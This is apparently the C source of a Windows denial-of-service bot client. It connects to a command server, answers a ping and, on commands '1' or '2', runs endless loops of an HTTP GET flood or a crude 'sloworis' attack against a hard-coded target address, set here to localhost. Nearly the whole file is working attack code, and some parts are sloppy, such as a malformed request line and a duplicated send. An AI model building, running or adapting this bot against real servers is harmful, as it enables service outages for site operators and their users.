#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <Windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

#pragma comment (lib, "ws2_32.lib");
#pragma comment (lib, "mswsock.lib");
#pragma comment (lib, "advapi32.lib");

#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27015"
#define BUFF_SIZE 1024
#define PORT 80
#define IPADDR "127.0.0.1"


int iResult;

int getflooding() {
	char message[BUFF_SIZE];
	int len;
	char szBuf[2048];

	
	SOCKET sock = socket(PF_INET, SOCK_STREAM, 0);
	SOCKADDR_IN addr;

	if (sock == INVALID_SOCKET) {
		perror("Sock Error ");
		system("pause");
		return -1;
	}

	
	addr.sin_family = AF_INET; 
	addr.sin_port = htons(PORT); 
	addr.sin_addr.s_addr = inet_addr(IPADDR);
	
	if (connect(sock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
		printf("Not Connect \n");
		system("pause");
		return 1; 
	}

	memset(szBuf, 0, sizeof(szBuf));
	snprintf(szBuf, sizeof(szBuf),
		"GET / 127.0.0.1:80 http/1.1\r\n"
		"HOST: 127.0.0.1:80 \r\n"
		"Cache-Control: noCache\r\n"
		"\r\n"
	);
	

	int iResult2;

	while (1) {
		iResult2 = send(sock, szBuf, sizeof(szBuf), 0);
		send(sock, szBuf, sizeof(szBuf), 0);

		if (iResult2 == SOCKET_ERROR) {
			printf("send failed with error: %d\n", WSAGetLastError());
			memset(szBuf, 0, sizeof(szBuf));
			break;
		}

		printf("get flooding success\n\n");
	}
}

int sloworis() {
	char message[BUFF_SIZE];
	int len;

	SOCKET sock = socket(PF_INET, SOCK_STREAM, 0);
	SOCKADDR_IN addr;

	if (sock == INVALID_SOCKET) {
		perror("Sock Error ");
		system("pause");
		return -1;
	}

	addr.sin_family = AF_INET;
	addr.sin_port = htons(PORT);
	addr.sin_addr.s_addr = inet_addr(IPADDR);


	if (connect(sock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
		printf("Not Connect \n");
		system("pause");
		return 1;
	}

	char msg[1024] = "GET /?127.0.0.1 HTTP/1.1\r\n";

	struct hostent* host;
	host = gethostbyname("127.0.0.1");
	addr.sin_family = AF_INET;
	addr.sin_port = htons(80);
	addr.sin_addr.s_addr = inet_addr(inet_ntoa(*(struct in_addr*) * host->h_addr_list));

	while (1) {
		send(sock, msg, strlen(msg), 0);
		printf("sloworis attack success\n\n");
	}
}

int _cdecl main()
{
	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}
	printf("wsastartup finish\n");
	struct sockaddr_in addr;

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	addr.sin_port = htons(atoi(DEFAULT_PORT));

	int recvbuflen = DEFAULT_BUFLEN;

	
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}
		
	ConnectSocket = socket(PF_INET,SOCK_STREAM,0);
	if (ConnectSocket == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}
	printf("socket finish\n");

	iResult = connect(ConnectSocket, (SOCKADDR*)&addr,sizeof(addr));
	printf("connect finish\n");
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	} 

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}

	char recvbuf[DEFAULT_BUFLEN];
	int buflen = DEFAULT_BUFLEN;
	char message[5] = "pong";
	char message2[10] = "try again";

	while (1) {
		recv(ConnectSocket, recvbuf, buflen, 0);
		if (strcmp(recvbuf, "ping") == 0) {
			send(ConnectSocket, message, (int)strlen(message), 0);
			break;
		}

		else if (strcmp(recvbuf, "1") == 0) {
			getflooding();
		}
		else if (strcmp(recvbuf, "2") == 0) {
			sloworis();
		}

		else send(ConnectSocket, message2, (int)strlen(message2), 0);
	}

	closesocket(ConnectSocket);
	WSACleanup();

	return 0;
}


